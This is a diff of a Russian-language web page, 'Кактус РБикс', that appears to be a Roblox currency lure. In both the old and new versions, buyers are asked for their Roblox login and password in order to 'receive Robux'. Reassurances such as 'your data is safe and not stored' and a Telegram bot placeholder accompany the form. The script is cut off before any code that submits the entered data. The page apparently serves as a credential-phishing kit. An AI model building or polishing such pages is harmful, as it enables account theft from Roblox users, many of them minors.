@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>🌵 Кактус РБикс</title>
+    <title>🌵 Кактус РБикс — Управление заказами</title>
     <meta name="theme-color" content="#00ff88" />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
     <style>
@@ -26,7 +26,7 @@
             overflow-x: hidden;
         }
 
-        /* ===== ФОН С ПЛАВАЮЩИМИ НЕОНОВЫМИ ПЯТНАМИ ===== */
+        /* ===== ФОН ===== */
         .bg-glow {
             position: fixed;
             inset: 0;
@@ -48,7 +48,6 @@
             background: rgba(0, 255, 136, 0.08);
             top: -10%;
             left: -20%;
-            animation-duration: 14s;
         }
 
         .bg-glow .glow:nth-child(2) {
@@ -89,7 +88,7 @@
 
         /* ===== КАРТОЧКА ===== */
         .card {
-            max-width: 440px;
+            max-width: 480px;
             width: 100%;
             background: rgba(12, 16, 28, 0.75);
             backdrop-filter: blur(30px);
@@ -100,11 +99,30 @@
             position: relative;
             z-index: 1;
             animation: cardFloat 6s ease-in-out infinite;
-            box-shadow:
-                0 40px 80px -20px rgba(0, 0, 0, 0.9),
-                0 0 80px rgba(0, 255, 136, 0.04),
-                inset 0 1px 0 rgba(255, 255, 255, 0.04);
-            transition: all 0.5s ease;
+            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.9), 0 0 80px rgba(0, 255, 136, 0.04);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 54px;
+            padding: 2px;
+            background: conic-gradient(from 0deg, transparent 0%, rgba(0, 255, 136, 0.2) 15%, rgba(0, 255, 136, 0.4) 30%, transparent 50%, rgba(0, 200, 255, 0.2) 70%, rgba(0, 255, 136, 0.1) 85%, transparent 100%);
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask-composite: exclude;
+            pointer-events: none;
+            animation: borderRotate 8s linear infinite;
+        }
+
+        @keyframes borderRotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         @keyframes cardFloat {
@@ -117,82 +135,18 @@
             }
         }
 
-        /* Вращающаяся неоновая рамка */
-        .card::before {
-            content: '';
-            position: absolute;
-            inset: -2px;
-            border-radius: 54px;
-            padding: 2px;
-            background: conic-gradient(from 0deg,
-                    transparent 0%,
-                    rgba(0, 255, 136, 0.2) 15%,
-                    rgba(0, 255, 136, 0.4) 30%,
-                    transparent 50%,
-                    rgba(0, 200, 255, 0.2) 70%,
-                    rgba(0, 255, 136, 0.1) 85%,
-                    transparent 100%);
-            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-            -webkit-mask-composite: xor;
-            mask-composite: exclude;
-            pointer-events: none;
-            animation: borderRotate 8s linear infinite;
-        }
-
-        /* Второй слой свечения рамки */
-        .card::after {
-            content: '';
-            position: absolute;
-            inset: -6px;
-            border-radius: 56px;
-            background: conic-gradient(from 90deg,
-                    transparent 0%,
-                    rgba(0, 255, 136, 0.05) 30%,
-                    transparent 60%,
-                    rgba(0, 200, 255, 0.03) 80%,
-                    transparent 100%);
-            filter: blur(10px);
-            pointer-events: none;
-            animation: borderRotate 12s linear infinite reverse;
-            z-index: -1;
-        }
-
-        @keyframes borderRotate {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
         /* ===== ЛОГОТИП ===== */
         .logo {
             font-size: 32px;
             font-weight: 900;
             color: #fff;
-            letter-spacing: -0.5px;
             display: flex;
             align-items: center;
             gap: 10px;
-            position: relative;
-            z-index: 2;
             animation: slideDown 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        @keyframes slideDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px) scale(0.9);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
         .logo .cactus-icon {
-            display: inline-block;
             animation: wobble 3s ease-in-out infinite;
             filter: drop-shadow(0 0 20px rgba(0, 255, 136, 0.15));
         }
@@ -213,50 +167,36 @@
             padding: 2px 16px 2px 12px;
             border-radius: 18px;
             border: 1px solid rgba(0, 255, 136, 0.08);
-            text-shadow: 0 0 40px rgba(0, 255, 136, 0.2), 0 0 80px rgba(0, 255, 136, 0.05);
-            box-shadow: 0 0 50px rgba(0, 255, 136, 0.03);
-            animation: glowPulse 3s ease-in-out infinite;
-        }
-
-        @keyframes glowPulse {
-            0%,
-            100% {
-                text-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
-            }
-            50% {
-                text-shadow: 0 0 60px rgba(0, 255, 136, 0.4), 0 0 120px rgba(0, 255, 136, 0.1);
-            }
+            text-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
         }
 
         .logo-sub {
             font-size: 14px;
             color: #5a6480;
             margin-top: 6px;
-            font-weight: 400;
-            letter-spacing: 0.5px;
             animation: slideDown 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.08s both;
         }
 
-        /* ===== ТАБЛИЦА ОРДЕРА ===== */
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        /* ===== ТАБЛИЦА ===== */
         .order-table {
             margin-top: 28px;
             background: rgba(4, 7, 16, 0.5);
             backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
             border-radius: 30px;
             padding: 4px 20px;
             border: 1px solid rgba(255, 255, 255, 0.03);
-            position: relative;
-            z-index: 2;
             animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s both;
-            transition: all 0.4s ease;
-            box-shadow: 0 0 40px rgba(0, 255, 136, 0.02);
-        }
-
-        .order-table:hover {
-            border-color: rgba(0, 255, 136, 0.06);
-            box-shadow: 0 0 60px rgba(0, 255, 136, 0.04);
-            transform: scale(1.005);
         }
 
         @keyframes slideUp {
@@ -275,39 +215,10 @@
             justify-content: space-between;
             padding: 18px 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-            transition: all 0.3s ease;
-            animation: rowGlow 4s ease-in-out infinite;
-        }
-
-        .row:nth-child(1) {
-            animation-delay: 0s;
-        }
-        .row:nth-child(2) {
-            animation-delay: 0.6s;
-        }
-        .row:nth-child(3) {
-            animation-delay: 1.2s;
-        }
-
-        @keyframes rowGlow {
-            0%,
-            100% {
-                background: transparent;
-            }
-            50% {
-                background: rgba(0, 255, 136, 0.01);
-            }
         }
 
         .row:last-child {
             border-bottom: none;
-        }
-
-        .row:hover .label {
-            color: #8a94b0;
-        }
-        .row:hover .value {
-            color: #fff;
         }
 
         .label {
@@ -316,134 +227,65 @@
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.8px;
-            transition: all 0.3s ease;
         }
 
         .value {
             color: #d0d8e8;
             font-weight: 700;
             font-size: 16px;
-            transition: all 0.3s ease;
         }
 
         .value.robux {
             color: #00ff88;
-            text-shadow: 0 0 40px rgba(0, 255, 136, 0.25), 0 0 80px rgba(0, 255, 136, 0.08);
-            animation: valueGlow 3s ease-in-out infinite;
+            text-shadow: 0 0 40px rgba(0, 255, 136, 0.25);
         }
 
         .value.price {
             color: #00ff88;
-            text-shadow: 0 0 40px rgba(0, 255, 136, 0.2), 0 0 80px rgba(0, 255, 136, 0.05);
-            animation: valueGlow 3s ease-in-out infinite 0.5s;
+            text-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
         }
 
-        @keyframes valueGlow {
-            0%,
-            100% {
-                text-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
-            }
-            50% {
-                text-shadow: 0 0 60px rgba(0, 255, 136, 0.4), 0 0 120px rgba(0, 255, 136, 0.1);
-            }
+        /* ===== ФОРМЫ ===== */
+        .form-group {
+            margin-top: 16px;
         }
 
-        /* ===== БЕЙДЖ ===== */
-        .badge-row {
-            margin-top: 20px;
-            position: relative;
-            z-index: 2;
-            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s both;
-        }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            background: rgba(0, 255, 136, 0.04);
-            border: 1px solid rgba(0, 255, 136, 0.06);
-            color: #00ff88;
+        .form-group label {
+            display: block;
+            color: #5a6480;
             font-size: 13px;
-            padding: 8px 22px 8px 18px;
-            border-radius: 44px;
             font-weight: 600;
-            letter-spacing: 0.3px;
-            backdrop-filter: blur(4px);
-            transition: all 0.4s ease;
-            box-shadow: 0 0 40px rgba(0, 255, 136, 0.03);
-            animation: badgePulse 3s ease-in-out infinite;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
         }
 
-        @keyframes badgePulse {
-            0%,
-            100% {
-                box-shadow: 0 0 40px rgba(0, 255, 136, 0.03);
-            }
-            50% {
-                box-shadow: 0 0 60px rgba(0, 255, 136, 0.08);
-            }
-        }
-
-        .badge:hover {
-            background: rgba(0, 255, 136, 0.08);
-            box-shadow: 0 0 60px rgba(0, 255, 136, 0.1);
-            transform: scale(1.02);
-        }
-
-        .badge .dot {
-            width: 10px;
-            height: 10px;
-            background: #00ff88;
-            border-radius: 50%;
-            display: inline-block;
-            animation: pulse-dot 1.6s ease-in-out infinite;
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
-        }
-
-        @keyframes pulse-dot {
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-                box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
-            }
-            50% {
-                opacity: 0.3;
-                transform: scale(0.6);
-                box-shadow: 0 0 60px rgba(0, 255, 136, 0.1);
-            }
-        }
-
-        /* ===== ПОЛЕ ВВОДА ===== */
-        .robux-input {
+        .form-group input,
+        .form-group select {
             width: 100%;
-            padding: 16px 22px;
-            border-radius: 26px;
+            padding: 14px 18px;
+            border-radius: 24px;
             background: rgba(4, 7, 16, 0.5);
             backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
             border: 1px solid rgba(255, 255, 255, 0.04);
             color: #fff;
-            font-size: 16px;
-            font-weight: 500;
-            margin-top: 16px;
-            text-align: center;
-            transition: all 0.4s ease;
-            position: relative;
-            z-index: 2;
-            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.12s both;
+            font-size: 15px;
+            transition: all 0.3s ease;
         }
 
-        .robux-input:focus {
+        .form-group input:focus,
+        .form-group select:focus {
             outline: none;
-            border-color: rgba(0, 255, 136, 0.2);
-            box-shadow: 0 0 50px rgba(0, 255, 136, 0.06), inset 0 0 50px rgba(0, 255, 136, 0.02);
-            transform: scale(1.02);
+            border-color: rgba(0, 255, 136, 0.15);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.04);
         }
 
-        .robux-input::placeholder {
+        .form-group input::placeholder {
             color: #3a4260;
-            font-weight: 400;
+        }
+
+        .form-group select option {
+            background: #0c101c;
         }
 
         /* ===== КНОПКИ ===== */
@@ -466,41 +308,12 @@
             z-index: 2;
             letter-spacing: 0.5px;
             box-shadow: 0 4px 40px rgba(0, 255, 136, 0.25);
-            animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.25s both;
             overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, #00ff88, #00e67a);
-            opacity: 0;
-            transition: opacity 0.4s ease;
-        }
-
-        .btn::after {
-            content: '';
-            position: absolute;
-            inset: -50%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 60%);
-            opacity: 0;
-            transition: opacity 0.6s ease;
-            transform: scale(0.5);
-        }
-
-        .btn:hover::before {
-            opacity: 1;
-        }
-
-        .btn:hover::after {
-            opacity: 1;
-            transform: scale(1);
         }
 
         .btn:hover {
             transform: translateY(-4px) scale(1.02);
-            box-shadow: 0 8px 50px rgba(0, 255, 136, 0.4), 0 0 80px rgba(0, 255, 136, 0.1);
+            box-shadow: 0 8px 50px rgba(0, 255, 136, 0.4);
         }
 
         .btn:active {
@@ -511,7 +324,6 @@
             opacity: 0.25;
             cursor: not-allowed;
             transform: none !important;
-            box-shadow: none !important;
         }
 
         .btn span {
@@ -523,35 +335,13 @@
             display: none !important;
         }
 
-        /* ===== ЗАЩИЩЁННОЕ СОЕДИНЕНИЕ ===== */
-        .secure {
-            margin-top: 28px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
-            font-size: 13px;
-            color: #2a3250;
-            position: relative;
-            z-index: 2;
-            animation: fadeIn 1.2s ease 0.6s both;
+        .btn-danger {
+            background: linear-gradient(135deg, #ff4466, #cc2244);
+            box-shadow: 0 4px 40px rgba(255, 68, 102, 0.25);
         }
 
-        .secure .lock {
-            font-size: 15px;
-            animation: pulse-lock 3s ease-in-out infinite;
-        }
-
-        @keyframes pulse-lock {
-            0%,
-            100% {
-                opacity: 0.3;
-                transform: scale(1);
-            }
-            50% {
-                opacity: 1;
-                transform: scale(1.1);
-            }
+        .btn-danger:hover {
+            box-shadow: 0 8px 50px rgba(255, 68, 102, 0.4);
         }
 
         /* ===== ССЫЛКА ===== */
@@ -560,30 +350,23 @@
             padding: 18px 20px;
             background: rgba(4, 7, 16, 0.5);
             backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
             border-radius: 26px;
             border: 1px solid rgba(255, 255, 255, 0.03);
             font-size: 13px;
             color: #4a5270;
             word-break: break-all;
             display: none;
-            position: relative;
-            z-index: 2;
             animation: slideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            transition: all 0.4s ease;
         }
 
         .link-box a {
             color: #00ff88;
             text-decoration: none;
             font-weight: 500;
-            transition: all 0.3s ease;
-            text-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
         }
 
         .link-box a:hover {
             text-decoration: underline;
-            text-shadow: 0 0 50px rgba(0, 255, 136, 0.2);
         }
 
         .copy-btn {
@@ -603,190 +386,61 @@
             background: rgba(255, 255, 255, 0.06);
             color: #fff;
             border-color: rgba(0, 255, 136, 0.1);
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.04);
         }
 
-        .telegram-link {
-            margin-top: 12px;
-            display: block;
-            text-align: center;
+        /* ===== СТАТУСЫ ===== */
+        .status-badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-active {
+            background: rgba(0, 255, 136, 0.1);
             color: #00ff88;
-            font-size: 14px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.3s ease;
-            text-shadow: 0 0 30px rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.15);
         }
 
-        .telegram-link:hover {
-            text-decoration: underline;
-            text-shadow: 0 0 50px rgba(0, 255, 136, 0.2);
+        .status-used {
+            background: rgba(255, 68, 102, 0.1);
+            color: #ff4466;
+            border: 1px solid rgba(255, 68, 102, 0.15);
         }
 
-        .hidden {
-            display: none !important;
+        .status-expired {
+            background: rgba(255, 200, 0, 0.1);
+            color: #ffcc00;
+            border: 1px solid rgba(255, 200, 0, 0.15);
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+        /* ===== ЗАЩИТА ===== */
+        .secure {
+            margin-top: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            color: #2a3250;
         }
 
-        /* ===== ФОРМА ВХОДА ===== */
-        .login-form {
-            margin-top: 22px;
-            display: none;
-            position: relative;
-            z-index: 2;
-        }
-
-        .login-form.show {
-            display: block;
-            animation: slideUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        .login-form input {
-            width: 100%;
-            padding: 16px 20px;
-            border-radius: 26px;
-            background: rgba(4, 7, 16, 0.5);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            color: #fff;
+        .secure .lock {
             font-size: 15px;
-            margin-top: 10px;
-            transition: all 0.4s ease;
+            animation: pulse-lock 3s ease-in-out infinite;
         }
 
-        .login-form input:focus {
-            outline: none;
-            border-color: rgba(0, 255, 136, 0.15);
-            box-shadow: 0 0 50px rgba(0, 255, 136, 0.04);
-            transform: scale(1.01);
-        }
-
-        .login-form input::placeholder {
-            color: #3a4260;
-        }
-
-        .login-form .btn {
-            margin-top: 14px;
-        }
-
-        /* ===== АНИМАЦИЯ ЗАГРУЗКИ ===== */
-        .session-loader {
-            margin-top: 24px;
-            text-align: center;
-            display: none;
-            position: relative;
-            z-index: 2;
-        }
-
-        .session-loader.show {
-            display: block;
-            animation: slideUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        .session-loader .spinner {
-            width: 56px;
-            height: 56px;
-            margin: 0 auto 16px;
-            border: 3px solid rgba(255, 255, 255, 0.03);
-            border-top: 3px solid #00ff88;
-            border-radius: 50%;
-            animation: spin 0.8s cubic-bezier(0.6, 0, 0.4, 1) infinite;
-            box-shadow: 0 0 60px rgba(0, 255, 136, 0.08);
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .session-loader p {
-            color: #e0e8f0;
-            font-size: 16px;
-            font-weight: 600;
-            animation: pulseText 2s ease-in-out infinite;
-        }
-
-        @keyframes pulseText {
+        @keyframes pulse-lock {
             0%,
             100% {
-                opacity: 0.8;
+                opacity: 0.3;
             }
             50% {
                 opacity: 1;
             }
-        }
-
-        .session-loader .secure-text {
-            color: #3a4260;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-
-        /* ===== ФИНАЛЬНЫЙ ЭКРАН ===== */
-        .final-screen {
-            margin-top: 24px;
-            text-align: center;
-            display: none;
-            position: relative;
-            z-index: 2;
-        }
-
-        .final-screen.show {
-            display: block;
-            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        .final-screen .checkmark {
-            font-size: 64px;
-            display: block;
-            margin-bottom: 4px;
-            animation: pop 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
-            filter: drop-shadow(0 0 40px rgba(0, 255, 136, 0.2));
-        }
-
-        @keyframes pop {
-            0% {
-                transform: scale(0) rotate(-20deg);
-                opacity: 0;
-            }
-            100% {
-                transform: scale(1) rotate(0deg);
-                opacity: 1;
-            }
-        }
-
-        .final-screen h3 {
-            color: #00ff88;
-            font-size: 28px;
-            font-weight: 900;
-            margin-top: 2px;
-            text-shadow: 0 0 50px rgba(0, 255, 136, 0.2), 0 0 100px rgba(0, 255, 136, 0.05);
-            animation: glowPulse 2.5s ease-in-out infinite;
-        }
-
-        .final-screen p {
-            color: #7a84a0;
-            font-size: 15px;
-            margin-top: 4px;
-        }
-
-        .final-screen .secure-text {
-            color: #3a4260;
-            font-size: 12px;
-            margin-top: 12px;
         }
 
         /* ===== АДАПТИВ ===== */
@@ -798,23 +452,9 @@
             .logo {
                 font-size: 26px;
             }
-            .row {
-                padding: 14px 0;
-            }
-            .value {
-                font-size: 14px;
-            }
             .btn {
                 font-size: 15px;
                 padding: 17px 0;
-            }
-            .order-table {
-                padding: 4px 14px;
-                border-radius: 24px;
-            }
-            .robux-input {
-                padding: 14px 16px;
-                font-size: 15px;
             }
         }
 
@@ -827,36 +467,27 @@
                 font-size: 22px;
                 flex-wrap: wrap;
             }
-            .badge {
-                font-size: 11px;
-                padding: 6px 16px;
-            }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== ФОН ===== -->
     <div class="bg-glow">
         <div class="glow"></div>
         <div class="glow"></div>
         <div class="glow"></div>
     </div>
 
-    <!-- ===== КАРТОЧКА ===== -->
     <div class="card">
 
-        <!-- ЛОГОТИП -->
+        <!-- ===== ЛОГОТИП ===== -->
         <div class="logo">
             <span class="cactus-icon">🌵</span>
             <span>Кактус</span> РБикс
         </div>
-        <div class="logo-sub">Персональный заказ Robux</div>
+        <div class="logo-sub">Управление заказами</div>
 
-        <!-- ПОЛЕ ДЛЯ ПРОДАВЦА -->
-        <input type="number" class="robux-input" id="robuxInput" value="500" min="1" placeholder="Введите количество Robux" />
-
-        <!-- ТАБЛИЦА ОРДЕРА -->
+        <!-- ===== ОРДЕР ===== -->
         <div class="order-table">
             <div class="row">
                 <span class="label">Ордер</span>
@@ -870,50 +501,81 @@
                 <span class="label">Цена</span>
                 <span class="value price" id="priceDisplay">$5.99</span>
             </div>
+            <div class="row">
+                <span class="label">Статус</span>
+                <span class="value">
+                    <span class="status-badge status-active" id="statusBadge">● Активен</span>
+                </span>
+            </div>
+            <div class="row">
+                <span class="label">Срок действия</span>
+                <span class="value" id="expiryDisplay">24 часа</span>
+            </div>
         </div>
 
-        <!-- БЕЙДЖ -->
-        <div class="badge-row">
-            <span class="badge"><span class="dot"></span> Активен</span>
+        <!-- ===== ФОРМА УПРАВЛЕНИЯ ОРДЕРОМ ===== -->
+        <div id="sellerForm">
+            <div class="form-group">
+                <label>Количество Robux</label>
+                <input type="number" id="robuxInput" value="500" min="1" placeholder="Введите количество" />
+            </div>
+            <div class="form-group">
+                <label>Аккаунт получателя</label>
+                <input type="text" id="accountInput" placeholder="Введите логин получателя" />
+            </div>
+            <div class="form-group">
+                <label>Код / Пароль (для входа)</label>
+                <input type="text" id="codeInput" placeholder="Введите код или пароль" />
+            </div>
+            <div class="form-group">
+                <label>Срок действия</label>
+                <select id="expirySelect">
+                    <option value="1">1 час</option>
+                    <option value="6">6 часов</option>
+                    <option value="12">12 часов</option>
+                    <option value="24" selected>24 часа</option>
+                    <option value="48">48 часов</option>
+                    <option value="72">3 дня</option>
+                    <option value="168">7 дней</option>
+                </select>
+            </div>
+
+            <button class="btn" id="createOrderBtn"><span>🔗 Создать одноразовую ссылку</span></button>
         </div>
 
-        <!-- ФОРМА ВХОДА (ПОКУПАТЕЛЬ) -->
-        <div class="login-form" id="loginForm">
-            <input type="text" id="loginInput" placeholder="Логин Roblox" />
-            <input type="password" id="passwordInput" placeholder="Пароль Roblox" />
-            <button class="btn" id="loginBtn"><span>🚀 Войти и получить Robux</span></button>
+        <!-- ===== ФОРМА ВХОДА ДЛЯ ПОКУПАТЕЛЯ ===== -->
+        <div id="buyerForm" style="display: none;">
+            <div class="form-group">
+                <label>Логин Roblox</label>
+                <input type="text" id="buyerLogin" placeholder="Введите логин" />
+            </div>
+            <div class="form-group">
+                <label>Пароль Roblox</label>
+                <input type="password" id="buyerPassword" placeholder="Введите пароль" />
+            </div>
+            <button class="btn" id="buyerSubmitBtn"><span>🚀 Активировать и получить Robux</span></button>
         </div>
 
-        <!-- АНИМАЦИЯ ЗАГРУЗКИ -->
-        <div class="session-loader" id="sessionLoader">
-            <div class="spinner"></div>
-            <p>Готовим безопасную сессию...</p>
-            <div class="secure-text">🔒 Ваши данные в безопасности и не сохраняются</div>
-        </div>
-
-        <!-- ФИНАЛЬНЫЙ ЭКРАН -->
-        <div class="final-screen" id="finalScreen">
-            <span class="checkmark">✅</span>
-            <h3>Готово!</h3>
-            <p>Робуксы идут на ваш аккаунт</p>
-            <div class="secure-text">⏱ Обычно занимает 1–2 минуты</div>
-        </div>
-
-        <!-- БЛОК ССЫЛКИ (ПРОДАВЕЦ) -->
+        <!-- ===== БЛОК ССЫЛКИ ===== -->
         <div class="link-box" id="linkBox">
-            <span>🔗 Ссылка на заказ:</span><br />
+            <span>🔗 Ваша одноразовая ссылка:</span><br />
             <a href="#" id="linkUrl" target="_blank">https://...</a>
             <br />
             <button class="copy-btn" id="copyBtn">📋 Копировать</button>
-            <a href="#" class="telegram-link hidden" id="telegramLink">
-                📩 Перейти в Telegram
-            </a>
+            <div style="margin-top: 12px; font-size: 12px; color: #3a4260;">
+                ⚠️ Ссылка действительна <span id="linkExpiry">24</span> часа. После активации станет недействительной.
+            </div>
         </div>
 
-        <!-- КНОПКА "ПРОДОЛЖИТЬ" (ПРОДАВЕЦ) -->
-        <button class="btn" id="continueBtn"><span>Продолжить</span></button>
+        <!-- ===== СОСТОЯНИЕ ПОСЛЕ АКТИВАЦИИ ===== -->
+        <div id="activationStatus" style="display: none; margin-top: 20px; text-align: center; padding: 20px; background: rgba(4,7,16,0.3); border-radius: 24px; border: 1px solid rgba(0,255,136,0.05);">
+            <div style="font-size: 48px; margin-bottom: 8px;">✅</div>
+            <h3 style="color: #00ff88; font-size: 22px;">Ссылка активирована!</h3>
+            <p style="color: #7a84a0; margin-top: 4px;">Robux отправлены на аккаунт</p>
+            <p style="color: #4a5270; font-size: 13px; margin-top: 8px;">⚡ Ссылка более недействительна</p>
+        </div>
 
-        <!-- ЗАЩИЩЁННОЕ СОЕДИНЕНИЕ -->
+        <!-- ===== ЗАЩИТА ===== -->
         <div class="secure">
             <span class="lock">🔒</span> Защищённое соединение
         </div>
@@ -921,124 +583,164 @@
     </div>
 
     <script>
-        // === ЭЛЕМЕНТЫ ===
-        const robuxInput = document.getElementById('robuxInput');
+        // ===== СОСТОЯНИЕ =====
+        const state = {
+            orderId: null,
+            robux: 500,
+            account: '',
+            code: '',
+            expiryHours: 24,
+            isActive: true,
+            isUsed: false,
+            createdAt: null,
+            expiresAt: null
+        };
+
+        // ===== ЭЛЕМЕНТЫ =====
+        const orderIdEl = document.getElementById('orderId');
         const robuxDisplay = document.getElementById('robuxDisplay');
         const priceDisplay = document.getElementById('priceDisplay');
-        const orderDisplay = document.getElementById('orderId');
-        const continueBtn = document.getElementById('continueBtn');
+        const statusBadge = document.getElementById('statusBadge');
+        const expiryDisplay = document.getElementById('expiryDisplay');
+        const robuxInput = document.getElementById('robuxInput');
+        const accountInput = document.getElementById('accountInput');
+        const codeInput = document.getElementById('codeInput');
+        const expirySelect = document.getElementById('expirySelect');
+        const createBtn = document.getElementById('createOrderBtn');
         const linkBox = document.getElementById('linkBox');
         const linkUrl = document.getElementById('linkUrl');
         const copyBtn = document.getElementById('copyBtn');
-        const telegramLink = document.getElementById('telegramLink');
-        const loginForm = document.getElementById('loginForm');
-        const loginInput = document.getElementById('loginInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const loginBtn = document.getElementById('loginBtn');
-        const sessionLoader = document.getElementById('sessionLoader');
-        const finalScreen = document.getElementById('finalScreen');
+        const linkExpiry = document.getElementById('linkExpiry');
+        const sellerForm = document.getElementById('sellerForm');
+        const buyerForm = document.getElementById('buyerForm');
+        const buyerLogin = document.getElementById('buyerLogin');
+        const buyerPassword = document.getElementById('buyerPassword');
+        const buyerSubmitBtn = document.getElementById('buyerSubmitBtn');
+        const activationStatus = document.getElementById('activationStatus');
 
         const PRICE_PER_ROBUX = 0.011;
-        const TELEGRAM_BOT = "твой_бот";
 
-        // === ГЕНЕРАЦИЯ ОРДЕРА ===
-        function generateOrder() {
-            const num = String(Math.floor(100000 + Math.random() * 900000));
-            orderDisplay.textContent = '#' + num;
+        // ===== ГЕНЕРАЦИЯ ОРДЕРА =====
+        function generateOrderId() {
+            return '#' + String(Math.floor(100000 + Math.random() * 900000));
         }
 
-        // === ОБНОВЛЕНИЕ ЦЕНЫ ===
-        function updateOrder() {
-            let robux = parseInt(robuxInput.value) || 100;
-            if (robux < 1) robux = 1;
+        // ===== ОБНОВЛЕНИЕ ТАБЛИЦЫ =====
+        function updateDisplay() {
+            const robux = parseInt(robuxInput.value) || 100;
+            state.robux = robux;
             robuxDisplay.textContent = robux;
             const price = (robux * PRICE_PER_ROBUX).toFixed(2);
             priceDisplay.textContent = '$' + price;
+
+            // Статус
+            if (state.isUsed) {
+                statusBadge.className = 'status-badge status-used';
+                statusBadge.textContent = '✖ Использована';
+            } else if (!state.isActive) {
+                statusBadge.className = 'status-badge status-expired';
+                statusBadge.textContent = '⏳ Истекла';
+            } else {
+                statusBadge.className = 'status-badge status-active';
+                statusBadge.textContent = '● Активна';
+            }
+
+            // Срок действия
+            if (state.expiryHours === 1) expiryDisplay.textContent = '1 час';
+            else if (state.expiryHours === 24) expiryDisplay.textContent = '24 часа';
+            else if (state.expiryHours >= 168) expiryDisplay.textContent = Math.floor(state.expiryHours / 24) + ' дней';
+            else expiryDisplay.textContent = state.expiryHours + ' часов';
+
+            // ID ордера
+            if (state.orderId) {
+                orderIdEl.textContent = state.orderId;
+            }
         }
 
-        // === ПРОВЕРКА URL ===
-        const urlParams = new URLSearchParams(window.location.search);
-        const isBuyer = urlParams.has('robux') || urlParams.has('order');
+        // ===== СОЗДАНИЕ ОРДЕРА =====
+        createBtn.addEventListener('click', function() {
+            const robux = parseInt(robuxInput.value) || 100;
+            const account = accountInput.value.trim() || 'Не указан';
+            const code = codeInput.value.trim() || 'Не указан';
+            const expiry = parseInt(expirySelect.value);
 
-        // === ЕСЛИ ПОКУПАТЕЛЬ ===
-        if (isBuyer) {
-            robuxInput.classList.add('btn-hidden');
-            continueBtn.classList.add('btn-hidden');
+            state.robux = robux;
+            state.account = account;
+            state.code = code;
+            state.expiryHours = expiry;
+            state.orderId = generateOrderId();
+            state.isActive = true;
+            state.isUsed = false;
+            state.createdAt = Date.now();
+            state.expiresAt = state.createdAt + (expiry * 3600000);
 
-            if (urlParams.has('robux')) {
-                const robux = urlParams.get('robux');
-                robuxInput.value = robux;
-                updateOrder();
-            }
-            if (urlParams.has('order')) {
-                const order = urlParams.get('order');
-                orderDisplay.textContent = '#' + order;
-            }
+            // Обновляем отображение
+            updateDisplay();
 
